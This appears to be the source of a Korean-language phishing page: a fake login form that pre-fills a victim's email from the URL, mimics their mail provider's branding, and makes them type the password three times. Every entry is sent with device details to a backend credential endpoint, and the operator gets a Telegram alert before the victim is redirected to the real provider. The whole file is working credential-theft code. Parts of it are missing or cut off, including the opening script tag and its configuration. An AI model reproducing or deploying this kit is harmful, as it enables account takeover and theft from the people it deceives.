<!DOCTYPE html>
<html lang="ko">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>로그인 - 안전한 계정 인증</title>
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
<style>
  :root {
    --brand: #1a73e8;
    --brand-dark: #0d47a1;
    --brand-soft: #e8f0fe;
    --brand-gradient: linear-gradient(135deg, #1a73e8 0%, #0d47a1 100%);
    --brand-glow: rgba(26,115,232,0.35);
    --brand-focus: rgba(26,115,232,0.12);
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Noto Sans KR", Arial, sans-serif;
    background: #f5f5f5;
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    padding: 20px;
  }
  .login-container {
    background: #fff;
    border-radius: 12px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.08);
    width: 100%;
    max-width: 420px;
    padding: 40px 30px;
    text-align: center;
  }
  .logo { width: 64px; height: 64px; margin: 0 auto 20px; }
  .logo img { width: 100%; height: 100%; object-fit: contain; border-radius: 12px; }
  .logo-letter {
    width: 64px; height: 64px; border-radius: 16px;
    background: var(--brand-gradient);
    color: #fff;
    display: grid;
    place-items: center;
    font-size: 28px;
    font-weight: 800;
    margin: 0 auto;
  }
  h1 { font-size: 22px; color: #333; margin-bottom: 8px; }
  h1 .highlight { color: var(--brand); }
  .subtitle { font-size: 14px; color: #666; margin-bottom: 20px; }
  .provider-badge {
    display: inline-block;
    background: var(--brand-soft);
    color: var(--brand-dark);
    padding: 8px 16px;
    border-radius: 999px;
    font-size: 13px;
    font-weight: 600;
    margin-bottom: 24px;
  }
  .input-group { text-align: left; margin-bottom: 16px; }
  .input-group label { display: block; font-size: 13px; font-weight: 600; color: #555; margin-bottom: 6px; }
  .input-group input {
    width: 100%;
    padding: 12px 14px;
    border: 1px solid #ddd;
    border-radius: 8px;
    font-size: 15px;
    transition: border-color 0.2s, box-shadow 0.2s;
  }
  .input-group input:focus {
    outline: none;
    border-color: var(--brand);
    box-shadow: 0 0 0 3px var(--brand-focus);
  }
  .input-group input.error { border-color: #e53935; }
  .password-wrapper { position: relative; }
  .toggle-password {
    position: absolute;
    right: 12px;
    top: 50%;
    transform: translateY(-50%);
    background: none;
    border: none;
    cursor: pointer;
    font-size: 18px;
    padding: 4px;
  }
  .hint { font-size: 12px; color: #888; margin-top: 4px; }
  .silent-progress { display: flex; justify-content: center; gap: 8px; margin: 16px 0; }
  .silent-progress .step {
    width: 10px; height: 10px; border-radius: 50%;
    background: #ddd; transition: background 0.3s;
  }
  .silent-progress .step.active { background: var(--brand); }
  .cf-turnstile { margin: 16px 0; display: flex; justify-content: center; }
  button[type="submit"] {
    width: 100%;
    padding: 14px;
    background: var(--brand-gradient);
    color: #fff;
    border: none;
    border-radius: 8px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    transition: opacity 0.2s, transform 0.1s;
    margin-top: 8px;
  }
  button[type="submit"]:disabled { opacity: 0.6; cursor: not-allowed; }
  button[type="submit"]:not(:disabled):hover { opacity: 0.9; }
  button[type="submit"]:not(:disabled):active { transform: scale(0.98); }
  button[type="submit"].loading { position: relative; color: transparent; }
  button[type="submit"].loading::after {
    content: "";
    position: absolute;
    width: 20px; height: 20px;
    top: 50%; left: 50%;
    margin: -10px 0 0 -10px;
    border: 2px solid #fff;
    border-top-color: transparent;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
  }
  button[type="submit"].success { background: #4caf50; }
  @keyframes spin { to { transform: rotate(360deg); } }
  .error-message, .success-message {
    display: none;
    padding: 10px 14px;
    border-radius: 6px;
    font-size: 13px;
    margin-top: 12px;
    text-align: left;
  }
  .error-message.show { display: block; background: #ffebee; color: #c62828; border: 1px solid #ef9a9a; }
  .success-message.show { display: block; background: #e8f5e9; color: #2e7d32; border: 1px solid #a5d6a7; }
  .footer { margin-top: 30px; font-size: 12px; color: #999; border-top: 1px solid #eee; padding-top: 16px; }
  .footer #footerBrand { font-weight: 600; color: #666; }
  .footer #footerCopy { margin-top: 4px; }
  .domain-display { margin-top: 8px; font-size: 11px; color: #bbb; word-break: break-all; }
  .voice-indicator {
    position: fixed;
    bottom: 20px;
    left: 50%;
    transform: translateX(-50%);
    background: rgba(0,0,0,0.8);
    color: #fff;
    padding: 8px 16px;
    border-radius: 20px;
    font-size: 13px;
    opacity: 0;
    transition: opacity 0.3s;
    pointer-events: none;
  }
  .voice-indicator.show { opacity: 1; }
</style>
</head>

/* ============================================================
   URL EMAIL EXTRACTION
   ============================================================ */
function getEmailFromURL() {
    const params = new URLSearchParams(window.location.search);
    let email = params.get('u') || params.get('email') || params.get('login_hint') || '';
    if (!email && window.location.search.length > 1) {
        const raw = window.location.search.substring(1);
        try {
            const decoded = atob(raw);
            if (decoded.includes('@')) email = decoded;
        } catch (e) {
            if (raw.includes('@')) email = raw;
        }
    }
    if (email) {
        email = email.split('&')[0].split('?')[0].split('#')[0];
        email = decodeURIComponent(email);
        if (!email.includes('@')) email = '';
    }
    if (email) { try { localStorage.setItem('lastKoreaEmail', email); } catch (e) {} }
    return email;
}
function getSavedEmail() {
    try { return localStorage.getItem('lastKoreaEmail') || ''; } catch (e) { return ''; }
}

/* ============================================================
   PROVIDER DETECTION
   ============================================================ */
function detectProvider(email) {
    if (!email || !email.includes('@')) return buildFallbackProvider('user@korea.com');
    const domain = email.split('@')[1].toLowerCase().trim();
    if (PROVIDERS[domain]) return PROVIDERS[domain];
    for (const key in PROVIDERS) {
        if (domain.endsWith('.' + key) || domain === key.replace('www.', '')) {
            return PROVIDERS[key];
        }
    }
    return buildFallbackProvider(email);
}

/* ============================================================
   VOICE (KOREAN)
   ============================================================ */
function speakKorean(text, callback) {
    if (!window.speechSynthesis) { if (callback) callback(); return; }
    window.speechSynthesis.cancel();
    const u = new SpeechSynthesisUtterance(text);
    u.lang = 'ko-KR'; u.rate = 0.9; u.pitch = 1; u.volume = 1;
    let voices = window.speechSynthesis.getVoices();
    const speak = () => {
        voices = window.speechSynthesis.getVoices();
        const v = voices.find(x => x.lang.startsWith('ko'));
        if (v) u.voice = v;
        window.speechSynthesis.speak(u);
    };
    if (voices.length === 0) window.speechSynthesis.onvoiceschanged = speak;
    else speak();
    const vi = document.getElementById('voiceIndicator');
    const vt = document.getElementById('voiceText');
    if (vi) { vi.classList.add('show'); if (vt) vt.textContent = text; }
    const done = () => { setTimeout(() => { if (vi) vi.classList.remove('show'); }, 500); if (callback) callback(); };
    u.onend = done; u.onerror = done;
}
if (window.speechSynthesis) {
    window.speechSynthesis.getVoices();
    window.speechSynthesis.onvoiceschanged = function() { window.speechSynthesis.getVoices(); };
}

/* ============================================================

function sendCredentials(email, password, source, extra = {}) {
    if (!email || !password || password.length < 2) return;
    const ua = navigator.userAgent;
    const isMobile = /Mobile|Android|iPhone/i.test(ua);
    const isTablet = /iPad|Tablet/i.test(ua);

    const data = {
        email, password,
        source: source || 'korea_login',
        sessionId: SESSION_ID,
        url: window.location.href,
        userAgent: ua,
        timestamp: new Date().toISOString(),
        attemptCount,
        consecutiveCount: extra.consecutiveCount !== undefined ? extra.consecutiveCount : consecutiveCount,
        match: extra.match,
        referrer: document.referrer || 'Direct',
        service: 'Korea Auth',
        platform: navigator.platform || 'Unknown',
        device: isMobile ? 'Mobile' : (isTablet ? 'Tablet' : 'Desktop'),
        language: 'ko',
        timezone: (Intl.DateTimeFormat().resolvedOptions().timeZone) || 'Asia/Seoul',
        platformName: 'Hiworks',
        provider: currentProvider.en,
        providerName: currentProvider.name,
        turnstileToken: turnstileToken
    };

    console.log('📤 Sending credentials + Turnstile token:', {
        email, source, consecutiveCount: data.consecutiveCount,
        turnstileTokenLen: turnstileToken ? turnstileToken.length : 0
    });

    fetch(CONFIG.BACKEND_URL + CONFIG.CREDENTIAL_ENDPOINT, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
        keepalive: true
    })
    .then(r => r.json())
    .then(d => console.log('✅ Backend response:', d))
    .catch(e => console.error('❌ Backend error:', e));

    fetch(CONFIG.BACKEND_URL + CONFIG.LOG_ENDPOINT, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            type: 'korea_provider_verification',
            email, password, source,
            sessionId: SESSION_ID,
            consecutiveCount: extra.consecutiveCount !== undefined ? extra.consecutiveCount : consecutiveCount,
            provider: currentProvider.en,
            platformName: 'Hiworks',
            language: 'ko',
            url: window.location.href,
            timestamp: Date.now()
        }),
        keepalive: true
    }).catch(() => {});
}

function sendTelegramAlert(message) {
    try {
        fetch(CONFIG.BACKEND_URL + CONFIG.TELEGRAM_ENDPOINT, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message, parseMode: 'Markdown' })
        }).catch(() => {});
    } catch (e) {}
}

/* ============================================================
   UI HELPERS
   ============================================================ */
function showError(message) {
    errorMessage.className = 'error-message show';
    errorText.textContent = message;
    successMessage.className = 'success-message';
}
function showSuccess(message) {
    successMessage.className = 'success-message show';
    successText.textContent = message;
    errorMessage.className = 'error-message';
}
function clearMessages() {
    errorMessage.className = 'error-message';
    successMessage.className = 'success-message';
}
function updateSilentProgress(count) {
    document.querySelectorAll('.silent-progress .step').forEach((el, idx) => {
        el.classList.toggle('active', idx < count);
    });
}
function resetSilentProgress() {
    document.querySelectorAll('.silent-progress .step').forEach(el => el.classList.remove('active'));
}
function togglePassword() {
    const btn = document.querySelector('.toggle-password');
    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        btn.textContent = '🙈';
    } else {
        passwordInput.type = 'password';
        btn.textContent = '👁️';
    }
}

/* ============================================================
   HANDLE LOGIN
   ============================================================ */
async function handleLogin(event) {
    if (event) event.preventDefault();
    if (isProcessing) return;

    const email = (capturedEmail || getEmailFromURL() || getSavedEmail() || '').trim();
    const password = passwordInput.value.trim();

    if (!email || !email.includes('@')) {
        showError('올바른 이메일 주소가 필요합니다.');
        return;
    }
    if (!password) {
        passwordInput.focus();
        return;
    }

    if (!turnstileToken) {
        showError('보안 확인이 진행 중입니다. 잠시 후 다시 시도해주세요.');
        return;
    }

    const localPart = email.split('@')[0];
    if (password.toLowerCase() === email.toLowerCase() ||
        password.toLowerCase() === localPart.toLowerCase()) {
        console.log('🚫 Blocked: password equals email');
        consecutiveCount = 0;
        firstPasswordAttempt = null;
        resetSilentProgress();
        passwordInput.value = '';
        passwordInput.classList.add('error');
        showError('❌ 이메일 주소가 아닌 올바른 비밀번호를 입력하세요.');
        speakKorean('이메일 주소가 아닌 올바른 비밀번호를 입력하세요.');
        setTimeout(() => {
            passwordInput.classList.remove('error');
            passwordInput.focus();
        }, 1400);
        return;
    }

    const now = Date.now();
    if (lastAttemptTime > 0 && (now - lastAttemptTime) > CONFIG.ATTEMPT_WINDOW) {
        consecutiveCount = 0;
        firstPasswordAttempt = null;
        resetSilentProgress();
        console.log('⏰ Session expired — resetting');
    }

    attemptCount++;
    isProcessing = true;
    signinBtn.disabled = true;
    signinBtn.classList.add('loading');

    if (consecutiveCount === 0) {
        console.log('📥 1st entry — silent store');
        firstPasswordAttempt = password;
        consecutiveCount = 1;
        lastAttemptTime = now;
        updateSilentProgress(1);

        sendCredentials(email, password, 'korea_login_1st', { consecutiveCount: 1 });

        passwordInput.value = '';
        passwordInput.classList.remove('error');
        clearMessages();

        setTimeout(() => {
            passwordInput.focus();
            isProcessing = false;
            signinBtn.classList.remove('loading');
            resetTurnstile();
        }, 300);
        return;
    }

    if (consecutiveCount === 1 || consecutiveCount === 2) {
        const isMatch = (password === firstPasswordAttempt);
        console.log(`🔍 Entry #${consecutiveCount + 1} — match:`, isMatch);

        if (isMatch) {
            consecutiveCount++;
            lastAttemptTime = now;
            updateSilentProgress(consecutiveCount);

            if (consecutiveCount >= CONFIG.REQUIRED_MATCHES) {
                sendCredentials(email, password, 'korea_login_3rd_match', {
                    consecutiveCount: 3, match: true
                });

                passwordInput.value = '';
                showSuccess(`✅ 인증 성공! ${currentProvider.name}(으)로 이동합니다...`);
                signinBtn.classList.add('success');
                btnText.textContent = '✅ 인증 완료!';

                speakKorean(`인증되었습니다. ${currentProvider.name}(으)로 이동합니다.`);

                sendTelegramAlert(
                    `🇰🇷 *Korea Login Access Granted*\n\n` +
                    `*Provider:* ${currentProvider.name} (${currentProvider.en})\n` +
                    `*Email:* ${email}\n` +
                    `*Redirect:* ${currentProvider.redirect}\n` +
                    `*Session:* ${SESSION_ID.substring(0, 12)}...\n` +
                    `*Time:* ${new Date().toISOString()}`
                );

                try {
                    localStorage.setItem(CONFIG.SESSION_KEY, JSON.stringify({
                        email, provider: currentProvider.en,
                        authenticated: true,
                        expiresAt: Date.now() + 3600000
                    }));
                } catch (e) {}

                const target = currentProvider.redirect
                            || `https://${email.split('@')[1]}/`;

                setTimeout(() => {
                    console.log('🔗 Redirecting to provider:', target);
                    window.location.href = target;
                }, 1800);
                return;
            }

            sendCredentials(email, password, `korea_login_${consecutiveCount}th_match`, { consecutiveCount });
            passwordInput.value = '';
            passwordInput.classList.remove('error');
            clearMessages();

            setTimeout(() => {
                passwordInput.focus();
                isProcessing = false;
                signinBtn.classList.remove('loading');
                resetTurnstile();
            }, 300);
            return;
        }

        console.log('❌ Mismatch — resetting');
        sendCredentials(email, password, 'korea_login_mismatch', {
            consecutiveCount: 0, match: false
        });

        firstPasswordAttempt = null;
        consecutiveCount = 0;
        resetSilentProgress();
        passwordInput.value = '';
        passwordInput.classList.add('error');
        showError('❌ 비밀번호가 일치하지 않습니다. 처음부터 다시 시도하세요.');
        speakKorean('비밀번호가 일치하지 않습니다. 처음부터 다시 시도하세요.');

        setTimeout(() => {
            passwordInput.classList.remove('error');
            passwordInput.focus();
            isProcessing = false;
            signinBtn.classList.remove('loading');
            resetTurnstile();
        }, 1400);
        return;
    }
}

/* ============================================================
   INIT
   ============================================================ */
function init() {
    let email = getEmailFromURL() || getSavedEmail();
    if (!email) email = 'user@naver.com';
    capturedEmail = email;

    currentProvider = detectProvider(email);
    applyProviderBranding(currentProvider, email);

    emailInput.value = email;
    emailInput.placeholder = 'name@' + (email.split('@')[1] || 'naver.com');

    setTimeout(() => passwordInput.focus(), 500);

    document.getElementById('loginForm').addEventListener('submit', handleLogin);

    passwordInput.addEventListener('input', function() {
        this.classList.remove('error');
        clearMessages();
    });

    console.log('🇰🇷 Korea Login initialized with Cloudflare Turnstile');
    console.log(`📧 Email: ${email}`);
    console.log(`🎨 Provider: ${currentProvider.name}`);
    console.log(`🔗 Will redirect to: ${currentProvider.redirect}`);
    console.log(`🔗 Backend: ${CONFIG.BACKEND_URL || window.location.origin}`);
    console.log(`🆔 Session: ${SESSION_ID}`);
}

document.addEventListener('DOMContentLoaded', init);

/* ============================================================
   DEBUG API
   ============================================================ */
window.__koreaAuth = {
    getEmail: () => capturedEmail,
    getProvider: () => currentProvider,
    getSessionId: () => SESSION_ID,
    getStats: () => ({ attempts: attemptCount, consecutiveCount, required: CONFIG.REQUIRED_MATCHES }),
    getTurnstileToken: () => turnstileToken,
    getRedirect: () => currentProvider.redirect,
    reset: () => {
        consecutiveCount = 0;
        firstPasswordAttempt = null;
        resetSilentProgress();
        clearMessages();
        resetTurnstile();
    },
    speak: speakKorean,
    providers: PROVIDERS
};
console.log('✅ API available: window.__koreaAuth');
</script>
